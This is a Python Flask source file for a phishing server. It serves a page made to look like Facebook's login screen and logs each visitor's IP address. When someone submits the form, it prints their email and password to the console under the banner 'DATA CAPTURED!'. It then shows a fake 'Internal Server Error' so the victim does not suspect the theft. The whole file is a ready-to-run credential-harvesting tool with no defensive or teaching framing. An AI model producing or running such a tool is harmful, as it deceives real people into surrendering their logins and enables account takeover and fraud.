from flask import Flask, render_template_string, request
import os

from ui.ansi.style import *

app = Flask(__name__)

FB_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; text-align: center; }
        .logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 20px; }
        input { width: 90%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        .login-btn { width: 97%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
        .footer { font-size: 14px; margin-top: 16px; color: #1c1e21; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">facebook</div>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="footer"><a href="#">Forgotten password?</a></div>
    </div>
</body>
</html>
"""

def localloginpage():
    import os
    @app.route('/')
    def index():
        print(f"{Style.info} Visitor detected! -> IP: {Fg.red}{request.remote_addr}")
        return render_template_string(FB_TEMPLATE)

    @app.route('/login', methods=['POST'])
    def login():
        user_id = request.form.get('email')
        password = request.form.get('pass')
        print(f"{Style.success} DATA CAPTURED!")
        print(f"{Style.results} ID/Email : {user_id}")
        print(f"{Style.results} Password : {password}")
        return "Internal Server Error - Please try again later.", 500

    print(f"{Style.info} Server started at port 5000. Monitoring for visitors...")
    app.run(host='0.0.0.0', port=5000)
